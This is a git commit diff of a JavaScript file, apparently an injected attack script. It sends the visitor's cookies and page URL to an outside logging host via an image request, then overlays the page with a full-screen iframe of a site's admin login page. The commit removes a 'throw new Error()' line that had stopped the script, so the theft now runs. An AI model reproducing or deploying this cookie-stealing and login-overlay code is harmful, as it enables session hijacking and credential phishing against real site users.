955d2af1d1258fcede045bbb4c53fbc533687c77
9os <druidboykoston@gmail.com>
2017-03-09 01:16:01 -0600

    Add files via upload

--- a.js
+++ a.js
@@ -9,8 +9,6 @@ $data = encodeURIComponent(cookie+url);
 var imageObject = new Image();
 imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;
 
-	throw new Error();
-
 //Let page load first
 document.head.innerHTML = "<style>#login_iframe{width:100%;height:100%;border:none;position:absolute;left:0;top:0;overflow:hidden;z-index:1000000000000000;}</style>" + document.head.innerHTML;
 document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='https://www.lvlgo.com/admin_lvlgo/Login.aspx'></iframe>" + document.body.innerHTML;
